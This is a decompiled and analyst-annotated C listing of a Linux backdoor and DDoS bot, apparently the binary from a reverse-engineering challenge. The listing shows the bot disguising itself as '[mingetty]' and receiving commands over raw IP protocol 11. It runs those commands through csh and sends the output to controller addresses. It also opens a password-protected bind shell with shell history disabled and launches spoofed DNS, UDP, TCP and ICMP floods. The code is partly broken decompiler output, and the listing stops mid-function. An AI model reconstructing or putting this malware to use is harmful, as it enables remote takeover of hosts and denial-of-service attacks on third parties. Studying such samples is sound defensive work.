/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: 'the-binary'
 */


L08048080()
{



    return(L080675A8());
}

extern /* addr: 08048088 */  /*	Procedure: 0x08048088 - 0x0804808F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L08048088()

__entry_point__()
{
	/* unknown */ void  Vfffffff4;



    (restore)ecx;
    ebx = esp;
    eax = esp;
    eax = eax + ecx + ecx + ecx + ecx + 4;
    (save)0;
    (save)0;
    (save)0;
    ebp = esp;
    (save)eax;
    (save)ebx;
    (save)ecx;
    eax = 136; // PER_LINUX32?
    ebx = 0;
    // personality syscall
    asm("int 0x80");
    environ = Vfffffff4;
    L0805756C( globalvar000 & 65535);
    L08056D44();
    atexit(".fini"); // BAK - L08055F08(0x80675d0);
    L08048080();    // BAK - more initialization
    L08048134();    // BAK -must be main()
    main();
    exit(eax);
    // exit syscall
    for((restore)ebx; 1; asm("int 0x80");) {
        eax = 1;
    }
    goto L08048101;
}



#define BUFLEN 2048

unsigned char local_ip[4];
int last_command;
pid_t active_process;

main()
{



    (save)ebp;
    ebp = esp;
    esp = esp - 17648;
    (save)edi;
    (save)esi;
    (save)ebx;
    ebx = *(ebp + 12);
    *(ebp + -17600) = 1;
    char buffer[BUFLEN];    //*(ebp + -17616) = ebp + -2048;
    char *nvpheader = buffer+20; //*(ebp + -17620) = ebp + -2028;
    char *datastart = buffer+22; //*(ebp + -17624) = ebp + -2026;
    *addrlen = 16;

    // check for root privileges

    if(geteuid() != 0) {
        exit(-1);
    }
    edx = *ebx;
    al = 0;
    edi = edx;
    memset(edx, 0, strlen(edi) );
    edx = *ebx;
    *edx = *"[mingetty]";
    *(edx + 4) = *"getty]";
    *(edx + 8) = *"y]";
    *(edx + 10) = *"";
    signal_action(SIGCHLD, SIG_IGN);
    esp = esp + 20;
    if(fork() != 0) {
        exit(0);
    }
    setsid();
    signal_action(SIGCHLD, SIG_IGN);
    esp = esp + 8;
    if(fork() != 0) {
        exit(0);
    }

    // continue with child process

    chdir("/");
    close(0);
    close(1);
    close(2);
    active_process = 0;
    globalvar003 = 0;
    last_command = 0;
    esp = esp + 20;
    srand(time(0));
    sockfd = socket(AF_INET, SOCK_RAW, NVP);
    signal_action(SIGHUP, SIG_IGN);
    signal_action(SIGTERM, SIG_IGN);
    signal_action(SIGCHLD, SIG_IGN);
    esp = esp + 36;
    signal_action(SIGCHLD, SIG_IGN);
    
    char buffer2[BUFLEN]; //    *(ebp + -17632) = ebp + -4096;

    char buffer3[440]; // *(ebp + -17636) = ebp + -4536;


    while(1) {

        len = recv( sockfd, buffer, BUFLEN, 0);

	// buffer[9] points to ip header protocol field
        if(buffer[9] == 11 && *nvpheader == 2 && len > 200) {

            decode_buffer(len - 22, datastart, buffer2);

            eax = buffer2[1] - 1;
            if(eax <= 11) {
	      // case statement on eax
                goto *(eax * 4 + 0x804832c)[L0804835c, L080483f0, L08048590, L0804871c, L080487c8, L08048894, L08048acc, L08048b58, L08048b80, L08048c34, L08048d08, L08048de4, ]goto ( *(eax * 4 + 0x804832c));

		// case 0

                buffer[0] = "";
                buffer[0] = globalvar006;
                buffer[1] = 1;
                buffer[2] = 7;
                if(active_process == 0) {
                    buffer[3] = 0;
                } else {
                    buffer[3] = 1;
                    buffer[4] = last_command;
                }
                encode_buffer(400, buffer, buffer2);

                deliver_nvp(buffer3, buffer2, (rand() % 201) + 400);
                esp = esp + 24;
            }
        }
L08048eb8:
	precise_sleep(10000);
    }
    goto L080483a0;

    // case 1

    /* 
       prepares buffer3 and global variables globalvar007 and local_ip 
    */

    globalvar007 = buffer2[2];

    // reads local ip address from the IP packet (dest addr) it received

    local_ip[0] = buffer[16];
    local_ip[1] = buffer[17];
    local_ip[2] = buffer[18];
    local_ip[3] = buffer[19];

    srand(time(0));


    unsigned char r;
    int i,j,k, skip;

    skip = rand() % 10;

    j = 0;
    for (i = 0; i <= 9; i++) {
      if (i != skip) {
        if(globalvar007 == 2) {
	  buffer3[j] = buffer2[3+i*4];  // better would be: buffer2[3+j]
	  buffer3[j+1] = buffer2[4+i*4];
	  buffer3[j+2] = buffer2[5+i*4];
	  buffer3[j+3] = buffer2[6+i*4];
	}
	else {
	  for (k = 0; k < 4; k++) {
	    r = rand();
	    buffer3[j+k] = r;
	}
      }
      j += 4;
    }

      /*
    edi = rand() % 10;
    ebx = 0;
    esi = 0;
L08048454:
    if(ebx != edi) {
        if(globalvar007 == 2) {
	    al = buffer2[3+ebx*4]; // *(ebp + ebx * 4 + -4093);
            edx = *(ebp + -17636);
            *(edx + esi) = al;
            *(esi + edx + 1) = *(ebp + ebx * 4 + -4092);
            *(esi + edx + 2) = *(ebp + ebx * 4 + -4091);
            al = *(ebp + ebx * 4 + -4090);
        } else {
            eax = rand();
            *(ebp + -17648) = eax;
            if(eax < 0) {
                *(ebp + -17648) = eax + 255;
            }
            *(esi + *(ebp + -17636)) = al;
            eax = rand();
            *(ebp + -17648) = eax;
            if(eax < 0) {
                *(ebp + -17648) = eax + 255;
            }
            *(esi + *(ebp + -17636) + 1) = al;
            eax = rand();
            *(ebp + -17648) = eax;
            if(eax < 0) {
                *(ebp + -17648) = eax + 255;
            }
            *(esi + *(ebp + -17636) + 2) = al;
            eax = rand();
            *(ebp + -17648) = eax;
            if(eax < 0) {
                *(ebp + -17648) = eax + 255;
            }
            edx = *(ebp + -17636);
        }
        *(esi + edx + 3) = al;
    }
    esi = esi + 4;
    ebx = ebx + 1;
    if(ebx <= 9) {
        goto L08048454;
    }
      */

    if (globalvar007 == 0)
      skip = 0;
    else if (globalvar007 == 2)
      break; // out of case statement
             // we never fill in the 10th address, though

    offset = skip << 2; // points to space that was left out above
    
    for (k = 0; k < 4; k++)
      buffer3[offset+k] = buffer2[3+k];


    break;

    /*
    eax = globalvar007;
    if(eax == 0) {
        edi = 0;
    }
    if(eax == 2) {
        goto L08048eb8;
    }
    edi = edi << 2;
    *(ebp + -17644) = edi;
    al = *(ebp + -4093);
    ecx = *(ebp + -17636);
    *(edi + ecx) = al;
    al = *(ebp + -4092);
    edx = *(ebp + -17644);
    *(edx + ecx + 1) = al;
    *(edx + ecx + 2) = *(ebp + -4091);
    *(edx + ecx + 3) = *(ebp + -4090);
    goto L08048eb8;
    */

    // case 2

    // fork new process; parent returns to main loop, child continues
    if ((globalvar003 = fork()) != 0)
      break;

    setsid();
    signal_action(SIGCHLD, SIG_IGN);
    esp = esp + 8;

    // fork another process; looks like parent kills itself after 10 seconds
    if(fork() != 0) {
        sleep(10);
        kill(globalvar003, 9);
        exit(0);
    }

    for (i = 0; i <= 397; i++)
      buffer2[i] = buffer2[i+2];

    /*
    ebx = 0;
L080485dc:
    *(ebx + ebp + -4096) = *(ebx + ebp + -4094);
    ebx = ebx + 1;
    if(ebx <= 397) {
        goto L080485dc;
    }
    */

    sprintf(buffer, "/bin/csh -f -c \"%s\" 1> %s 2>&1", buffer2, "/tmp/.hj237349");
    system(buffer);
    fstream = fopen("/tmp/.hj237349", "rb");
    if (fstream != 0) {
      flag = 0;
      buffer4 = buffer3 + 40; // or is it 10?
      //loop here?
      while (read = fread(buffer, 1, 398, fstream)) {
	buffer[read] = 0;

	for (i = 0; i <= 397; i++)
	  buffer2[i+2] = buffer[i];

	if (flag == 0) {
	  buffer2[1] = 3;
	  flag = 1;
	}
	else
	  buffer2[1] = 4;

	encode_buffer(400, buffer2, buffer4);
      
	deliver_nvp(buffer3, buffer4, (rand() % 201)+400);

	precise_sleep(400000);

	// needed look at assembly code here to understand the
	// while loop: esi=fread(...) had been omitted

      }

    }
    //    _exit(0);
    // child process falls through and terminates, or do we explicitly need
    // to exit?

    /*
    ebx = ebp + -2048;
    sprintf(ebx, "/bin/csh -f -c \"%s\" 1> %s 2>&1", *(ebp + -17632), "/tmp/.hj237349");
    system(ebx);
    eax = fopen("/tmp/.hj237349", "rb");
    *(ebp + -17628) = eax;
    if(*(ebp + -17628) != 0) {
        edi = 0;
        *(ebp + -17640) = ebp + -4496;
L08048644:
        fread(ebp + -2048, 1, 398, *(ebp + -17628));
        *(eax + ebp + -2048) = 0;
        ebx = 0;
L08048670:
        *(ebx + ebp + -4094) = *(ebx + ebp + -2048);
        ebx = ebx + 1;
        if(ebx <= 397) {
            goto L08048670;
        }
        if(edi == 0) {
            *(ebp + -4095) = 3;
            edi = 1;
        } else {
            *(ebp + -4095) = 4;
        }
        encode_buffer(400, *(ebp + -17632), *(ebp + -17640));

        deliver_nvp(*(ebp + -17636), *(ebp + -17640), (rand() % 201)+400);
        precise_sleep(400000);
        esp = esp + 28;
        if(esi != 0) {
            goto L08048644;
        }
        fclose(*(ebp + -17628));
        unlink("/tmp/.hj237349");
    }
    _exit(0);
    */


    // case 3

    if(active_process != 0) 
      break;
    
    last_command = 4;


    // parent returns to main loop
    if((active_process = fork()) != 0) 
      break;

    
    // "rep movsd" seems to be a double word move.
    // esi holds the source buffer, edi the destination, 
    // and ecx the number of QWORDS (8-byte).
    // I believe this a compiler optimization of memcpy, 
    // as everything is word-aligned.

    char buffer5[504]; 

    memcpy(buffer5, buffer2, 504);

    /*    
    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;
    */


    for (i = 0; i<= 254; i++) 
      buffer5[i] = buffer5[i+9];

    /*
    ebx = 0;
L08048760:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17587);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L08048760;
    }

    */

    dos_dns_udp(buffer2[2], buffer2[3], buffer2[4], buffer2[5], 0, 
	     buffer2[6], buffer2[7], buffer2[8], buffer5);


    /*
    L08049174( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, 0, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, ebp + -17596);
    */

    _exit(0);

    // case 4

    if(active_process != 0)
      break;
    
    last_command = 5;

    if((active_process = fork()) != 0)
      break;
    
    memcpy(buffer5, buffer2, 504);

    /*
    edi = ebp + -17596;
    esi = ebp + -4096;
    // could be a memcopy
    // memcpy(ebp + -17596, ebp + -4096, 63)
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;
    // end of memcpy?
    */

    for (i = 0; i < 254; i++) 
      buffer5[i] = buffer5[i+13]; // different offset than case 3

    /*
    ebx = 0;
L0804880c:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17583);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L0804880c;
    }
    */


    send_udp_or_icmp( buffer2[2], buffer2[3], buffer2[4], buffer2[5], 
		      buffer2[6], buffer2[7], buffer2[8], buffer2[9], 
		      buffer2[10], buffer2[11], buffer2[12], buffer5);

    /*
    L080499F4( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, *(ebp + -4087) & 255, *(ebp + -4086) & 255, *(ebp + -4085) & 255, *(ebp + -4084) & 255, ebp + -17596);
    */

    _exit(0);

    // case 5

    if(active_process != 0) 
      break;

    last_command = 6;

    signal_action(SIGCHLD, SIG_IGN);

    //    esp = esp + 8;

    if((active_process = fork()) != 0)
      break;

    setsid();
    signal_action(SIGCHLD, SIG_IGN);

    struct sockaddr *my_addr;

    my_addr->sin_family = AF_INET;
    my_addr->sin_port = 61786; // network byte order, real port is 23281
    my_addr->sin_addr = 0; // wildcard address

    *optval = 1;
    sockfd = socket(AF_INET, SOCK_STREAM, IP);
    signal_action(SIGCHLD, SIG_IGN);
    signal_action(SIGCHLD, SIG_IGN);
    signal_action(SIGHUP, SIG_IGN);

    //    esp = esp + 36;

    signal_action(SIGTERM, SIG_IGN);
    signal_action(SIGINT, SIG_IGN);
    setsockopt( sockfd, SOL_SOCKET, SO_REUSEADDR , optval, 4);
    bind(sockfd, my_addr, 16);
    listen( sockfd, 3);

    struct sockaddr_in cli_sock;
    char buffer6[19];

    while(1) {
      client_sockfd = accept( sockfd, cli_sock, addrlen);
      if(client_sockfd != 0) {

	// parent continues accepting connections
        if(fork() != 0)
	  continue;
        
        recv( client_sockfd, buffer6, 19, 0);

	for (i = 0; i <= 18; i++) {
	  // look for '\n' or '\r' 
	  if (buffer6[i] == 10 || buffer6[i] == 13) 
	    buffer[i] = 0;
	  else
	    buffer[i] = buffer[i] + 1;
	}
	
	if (memcmp(buffer6, "TfOjG", 6)) {
	  send(client_sockfd, 0x806761d, 4, 0);
	  // address 0x806761d is part of <.rodata> and contains:
	  // 0xff 0xfb 0x01 0x00
	  close(client_sockfd);
	  exit(1);
        }
	dup2(client_sockfd, 0);
        dup2(client_sockfd, 1);
        dup2(client_sockfd, 2);
        setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin/:.", 1);
        unsetenv("HISTFILE"); 
        setenv("TERM", "linux", 1);
        execl("/bin/sh", "sh", 0);
        close(client_sockfd);
        exit(0);	
      }
    }
    exit(0);

	/*
L08048984:
    client_sockfd = accept( sockfd, ebp + -4568, addrlen);
    if(client_sockfd != 0) {
        if(fork() != 0) {
            goto L08048984;
        }
        recv( client_sockfd, ebp + -17340, 19, 0);
        ebx = 0;
L080489d4:
        al = *(ebx + ebp + -17340);
        if(al == 10 || al == 13) {
            *(ebx + ebp + -17340) = 0;
        } else {
            *(ebx + ebp + -17340) = al;
            *(ebx + ebp + -17340) = *(ebx + ebp + -17340) + 1;
        }
        ebx = ebx + 1;
        if(ebx <= 18) {
            goto L080489d4;
        }

	// possibly a memcmp, not sure what first string is, though.
	// probably ebp + -17340, there is the following line ine the asm file
	// lea    0xffffbc44(%ebp),%esi
	// memcmp(ebp + -17340 , edi, 6)

	//        edi = "TfOjG";
	//        ecx = 6;
	//        asm("cld");
	//        asm("repe cmpsb");
	//        if(!(esi = ebp + -17340)) {

	if (!memcmp(ebp + -17340, "TfOjG", 6) {
            send(client_sockfd, 0x806761d, 4, 0);
            close(client_sockfd);
            exit(1);
        }
        dup2(client_sockfd, 0);
        dup2(client_sockfd, 1);
        dup2(client_sockfd, 2);
        setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin/:.", 1);
        unsetenv("HISTFILE"); 
        setenv("TERM", "linux", 1);
        execl("/bin/sh", "sh", 0);
        close(client_sockfd);
        esp = esp + 32;
        exit(0);
    }
    exit(0);
*/

    // case 6

    if((globalvar003 = fork()) != 0)
      break;

    // note that last_command is not set here!

    setsid();
    signal_action(SIGCHLD, SIG_IGN);

    //    esp = esp + 8;


    // parent kills itself after 20 minutes
    if(fork() != 0) {
        sleep(1200);
        kill(globalvar003, 9);
        exit(0);
    }

    for (i = 0; i <= 397; i++)
      buffer2[i] = buffer2[i+2];

    /*
    ebx = 0;
L08048b1c:
    *(ebx + ebp + -4096) = *(ebx + ebp + -4094);
    ebx = ebx + 1;
    if(ebx <= 397) {
        goto L08048b1c;
    }
    */


    sprintf(buffer, "/bin/csh -f -c \"%s\" ", buffer2);
    system(buffer);
    _exit(0);

    /*
    ebx = ebp + -2048;
    sprintf(ebx, "/bin/csh -f -c \"%s\" ", *(ebp + -17632));
    system(ebx);
    _exit(0);
    */

    // case 7

    // kills the process stored in active_process, if it exists

    if(active_process == 0)
      break;

    kill(active_process, 9);
    active_process = 0;
    break;

    // case 8

    if(active_process != 0) 
        break;
    
    last_command = 9;

    if((active_process = fork()) != 0)
      break;
    
    memcpy(buffer5, buffer2, 504);

    /*
    // memcpy(edi, esi, 63);
    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;
    // end of memcpy?
    */

    for (i = 0; i <= 254; i++)
      buffer5[i] = buffer5[i+10];

    /*
    ebx = 0;
L08048bc4:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17586);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L08048bc4;
    }
    */


    dos_dns_udp( buffer2[2], buffer2[3], buffer2[4], buffer2[5], buffer2[6], 
	      buffer2[7], buffer2[8], buffer2[9], buffer5);

    /*
    dos_dns_udp( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, *(ebp + -4087) & 255, ebp + -17596);
    */

    _exit(0);

    // case 9

    if(active_process != 0) 
      break;
    
    last_command = 10;

    if((active_process = fork()) != 0)
      break;
    
    memcpy(buffer5, buffer2, 504);

    /*
    // memcpy(edi, esi, 63);
    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;
    // end of memcpy?
    */

    for (i = 0; i <= 254; i++)
      buffer5[i] = buffer5[i+14];

    /*
    ebx = 0;
L08048c78:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17582);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L08048c78;
    }
    */

    send_tcp( buffer2[2], buffer2[3], buffer2[4], buffer2[5], buffer2[6], 
	      buffer2[7], buffer2[8], buffer2[9], buffer2[10], buffer2[11], 
	      buffer2[12], 0, buffer2[13], buffer5);

    /*
    send_tcp( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, *(ebp + -4087) & 255, *(ebp + -4086) & 255, *(ebp + -4085) & 255, *(ebp + -4084) & 255, 0, *(ebp + -4083) & 255, ebp + -17596);
    */
    _exit(0);

    // case 10

    if(active_process != 0)
      break;

    last_command = 11;

    if((active_process = fork()) != 0)
      break;

    // copy-pasted from case 9, only modified numbers in buffer5 loop
    // and function parameters

    memcpy(buffer5, buffer2, 504);

   /*
    // memcpy(edi, esi, 63);
    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;
    // end of memcpy?
    */

    for (i = 0; i <= 254; i++)
      buffer5[i] = buffer5[i+15];

    /*
    ebx = 0;
L08048d4c:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17581);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L08048d4c;
    }
    */

    send_tcp( buffer2[2], buffer2[3], buffer2[4], buffer2[5], buffer2[6], 
	      buffer2[7], buffer2[8], buffer2[9], buffer2[10], buffer2[11], 
	      buffer2[12], buffer2[13], buffer2[14], buffer5);

    /*
    send_tcp( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, *(ebp + -4087) & 255, *(ebp + -4086) & 255, *(ebp + -4085) & 255, *(ebp + -4084) & 255, *(ebp + -4083) & 255, *(ebp + -4082) & 255, ebp + -17596);
    */

    _exit(0);

    // case 11

    if(active_process != 0)
      break;

    last_command = 12;
    eax = fork();
    active_process = eax;
    if((active_process = fork()) != 0) 
      break;

    memcpy(buffer5, buffer2, 504);

    /*
    // memcpy(edi, esi, 63);
    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;
    // end of memcpy?
    */

    for (i = 0; i <= 254; i++)
      buffer5[i] = buffer5[i+14];

    /*
    ebx = 0;
L08048e28:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17582);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L08048e28;
    }
    */

    more_udp_stuff( buffer2[2], buffer2[3], buffer2[4], buffer2[5], 
		    buffer2[6], buffer2[7], buffer2[8], buffer2[9], 
		    buffer2[10], buffer2[11], buffer2[12], buffer2[13], 
		    buffer5);

    /*
    more_udp_stuff( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, *(ebp + -4087) & 255, *(ebp + -4086) & 255, *(ebp + -4085) & 255, *(ebp + -4084) & 255, *(ebp + -4083) & 255, ebp + -17596);
    */

    _exit(0);
    break;
}


//L08048ECC(A8, Ac, A10)
deliver_nvp(char *destinations, char *data, int length)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;


    char *destaddr;
    
    if(globalvar007 != 0) {
      for (destaddr = destinations; // from assembly code
	   destaddr <= destinations + 36; // or should it be 9?
	   destaddr++) {

            precise_sleep(4000);
            send_nvp(&local_ip, destaddr, data, length);
      }
    }
    else
      send_nvp(&local_ip, destinations, data, length); 

    return(1);

    /*
      if(globalvar007 != 0) {
        esi = A8 + 36;
        do {
	  precise_sleep(4000);
	  send_nvp(&local_ip, ebx, Ac, A10);
	  ebx = ebx + 4;
	} while(ebx <= esi);
      } else {
      send_nvp(&local_ip, A8, Ac, A10); 
    }
    return(1);
    */

}




//L08048F94(A8, Ac, A10, A14)
send_nvp(char *source_ip, char *dest_ip, char *data, int length)
/* unknown */ void  A8;  // source ip
/* unknown */ void  Ac;  // dest ip
/* unknown */ void  A10; // data
/* unknown */ void  A14; // total length + 1
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vffffffc0;
	/* unknown */ void  Vffffffc4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffce;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff2;
	/* unknown */ void  Vfffffff4;

    int sockfd;
    struct iphdr *packet;
    unsigned char[16] addr_string;


    sockfd = socket(AF_INET, SOCK_RAW, RAW);
    if (sockfd != -1) {
      packet = (char *) malloc(length+23);
      if (packet == NULL)
	return 0;
    }
    else
      return 0;

    /*
    ebx = Ac;
    eax = socket(AF_INET, SOCK_RAW, RAW);
    Vffffffbc = eax;
    if(Vffffffbc != -1) {
        esi = malloc(A14 + 23);
        if(esi != 0) {
            goto L08048fd8;
        }
    }
    eax = 0;
    goto L0804912c;
L08048fd8:
    */

    nvpheader = packet + 20; // pointer to nvp header
    datastart = packet + 22; // pointer to nvp header
    
    (char *)packet[12] = source_ip[0]; // fill in source ip address
    (char *)packet[13] = source_ip[1];
    (char *)packet[14] = source_ip[2];
    (char *)packet[15] = source_ip[3];

    (char *)packet[16] = dest_ip[0];
    (char *)packet[17] = dest_ip[1];
    (char *)packet[18] = dest_ip[2];
    (char *)packet[19] = dest_ip[3];

    /*    
    Vffffffc4 = esi;
    Vffffffc0 = esi + 20;     // pointer to nvp header
    Vffffffc8 = esi + 22;     // pointer to data
    *(esi + 12) = *A8;        // ip source address
    *(esi + 13) = *(A8 + 1);
    *(esi + 14) = *(A8 + 2);
    *(esi + 15) = *(A8 + 3);
    *(esi + 16) = *ebx;       // ip dest address
    *(esi + 17) = *(ebx + 1);
    *(esi + 18) = *(ebx + 2);
    *(esi + 19) = *(ebx + 3);
    */

    sprintf(addr_string, "%d.%d.%d.%d", dest_ip[0], dest_ip[1], 
	    dest_ip[2], dest_ip[3]);

    sdest.sin_addr.s_addr = get_ip_addr(addr_string);
    sdest.sin_port = 10; // not sure if this makes sense
    sdest.sin_family = 2; // AF_INET

    /*
    // the parameters for sprintf are actually pushed before the new
    // ebx assignment. Thus ebx still points to Ac for those.
    ebx = & Vffffffd0;
    sprintf(ebx, "%d.%d.%d.%d", *ebx & 255, *(ebx + 1) & 255, *(ebx + 2) & 255, *(ebx + 3) & 255);
    Vfffffff4 = get_ip_addr(ebx);
    Vfffffff2 = 10;
    Vfffffff0 = 2;
    */

    packet->version = 4;
    packet->ihl = 5;
    packet->ttl = 250;
    packet->protocol = 11;
    packet->tot_len = hotons(length+22);
    packet->tos = 0;
    packet->id = htons(rand());
    packet->frag_off = 0;
    packet->check = 0;

    /*
    *esi = 69; // ip version and hl
    *(esi + 8) = 250; // ttl
    *(esi + 9) = 11; // ip protocol: NVP
    *(esi + 2) = htons(A14 + 22); // total length
    *(esi + 1) = 0; // tos
    *(esi + 4) = htons(rand()); // identification
    *(esi + 6) = 0; // flags and fragment offset
    *(esi + 10) = 0; // checksum
    */

    // checksum calculation

    packet->check = in_cksum(packet, 20);

    /*
    edx = 20;
    ecx = esi;
    ebx = 0;
    Vffffffce = 0;
    do {
        ebx = ebx + ( *ecx & 65535);
        ecx = ecx + 2;
        edx = edx + -2;
    } while(edx > 1);
    != ? 0x80490b1 : ;
    Vffffffce = *ecx;
    ebx = ebx + (Vffffffce & 65535);
    edx = ebx >> 16;
    ebx = (bx & 65535) + edx;
    ax = !(ebx + (ebx >> 16));
    Vffffffce = ax;
    *(Vffffffc4 + 10) = Vffffffce;
    */

    *nvpheader = 3;
    memmove(datastart, data, length);
    if (sendto(sockfd, packet, length+22, 0, &sdest, 16) == -1) {
      free(packet);
      return 0;
    } else {
      close(sockfd);
      free(packet);
      return 1;
    }

    /*
    *Vffffffc0 = 3;
    memmove(Vffffffc8, A10, A14); // copy data
    if(sendto(Vffffffbc, esi, A14 + 22, 0, & Vfffffff0, 16) == -1) {
        free(esi);
        eax = 0;
    } else {
        close(Vffffffbc);
        free(esi);
        eax = 1;
    }
L0804912c:
    esp = ebp - 80;
    */

}



//L08049138(A8)
get_ip_addr(char *addr_string)
/* unknown */ void  A8;
{

  struct hostent *h;
  char *first_entry;

  if ((h = gethostbyname(addr_string)) != NULL) {
    first_entry = *(h->h_addr_list);
    memmove(&globalvar009, first_entry, h->h_length);
    return(globalvar009);
  }
  
  return 0;

  /*
    ecx = gethostbyname(A8);
    if(ecx != 0) {
        edx = *( *(ecx + 16));
        memmove(&globalvar009, edx, *(ecx + 12));
        return(globalvar009);
    }
    esp = ebp;
    return(0);
  */

}



//L08049174(A8, Ac, A10, A14, A18, A1c, A20, A24, A28)
dos_dns_udp(A8, Ac, A10, A14, A18, A1c, A20, A24, A28)
/* unknown */ void  A8;  // source addr byte 1 nbo
/* unknown */ void  Ac;  // source addr byte 2
/* unknown */ void  A10; // source addr byte 3
/* unknown */ void  A14; // source addr byte 4
/* unknown */ void  A18; // number of sends before sleep
/* unknown */ void  A1c; // udp source port high byte
/* unknown */ void  A20; // udp source port low byte
/* unknown */ void  A24; // flag whether source ip params will be used
/* unknown */ void  A28; // buffer with source address?
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffff98c;
	/* unknown */ void  Vfffff990;
	/* unknown */ void  Vfffff994;
	/* unknown */ void  Vfffff998;
	/* unknown */ void  Vfffff99c;
	/* unknown */ void  Vfffff9a0;
	/* unknown */ void  Vfffff9a4;
	/* unknown */ void  Vfffff9a8;
	/* unknown */ void  Vfffff9ac;
	/* unknown */ void  Vfffff9b0;
	/* unknown */ void  Vfffff9b4;
	/* unknown */ void  Vfffff9b8;
	/* unknown */ void  Vfffff9bc;
	/* unknown */ void  Vfffff9c2;
	/* unknown */ void  Vfffff9c4;
	/* unknown */ void  Vfffff9c8;
	/* unknown */ void  Vfffff9d4;
	/* unknown */ void  Vfffff9d5;
	/* unknown */ void  Vfffff9d6;
	/* unknown */ void  Vfffff9d7;
	/* unknown */ void  Vfffff9dc;
	/* unknown */ void  Vfffff9e4;
	/* unknown */ void  Vfffffdd8;
	/* unknown */ void  Vfffffdda;
	/* unknown */ void  Vfffffddc;
	/* unknown */ void  Vfffffde8;
	/* unknown */ void  Vffffffdc;


    char packet[1024];
    struct in_addr* dst_pointer;

    Vfffff9bc = A8;
    Vfffff9b8 = Ac;
    Vfffff9b4 = A10;
    Vfffff9b0 = A14;

    // memcpy(edi, esi, 36);

    // Vffffffdc is ebp + -36

    //    char buffer1[36];
    unsigned long buffer1[9];

    /*
      0x00000015   21
      0x00000014   20
      0x00000015   21
      0x00000015   21
      0x00000019   25
      0x00000014   20
      0x00000014   20
      0x00000014   20
      0x00000047   71
      ---------------
                  239  
    */

    memcpy(buffer1, 0x8067698, 36);


    /*
    edi = & Vffffffdc;
    esi = 0x8067698;    // part of .rodata 0x15 0x00 0x00 0x00 0x15 0x00 0x00 ...
    asm("cld");
    ecx = 9;            // 36 bytes?
    asm("rep movsd");
    */

    first_iter = 1;

    // memcpy(edi, esi, 500);

    // Vfffffde8 is ebp + -536

    char buffer2[500];

    memcpy(buffer2, 0x80676bc, 500);

    /*
    edi = & Vfffffde8;
    esi = 0x80676bc;  // 0x47 0x6e 0x01 0x00 0x00 0x01 ...
    asm("cld");
    ecx = 125;
    asm("rep movsd");
    */

    iph = (struct iphdr *)(packet); //    esi = & Vfffff9c8;
    udph = (struct udphdr *) (packet + 20);  //    Vfffff9a4 = & Vfffff9dc;
    datastart = (char *) (packet + 28); // Vfffff9a0 = & Vfffff9e4;

    sdest.sin_family = 2; // Vfffffdd8 = 2;
    sdest.sin_port = 0;   //Vfffffdda = 0;

    if(A18 != 0) {
        A18 = A18 - 1;
    }

    if((sockfd = socket(AF_INET, SOCK_RAW, RAW)) > 0) {
      group_sent = 0;
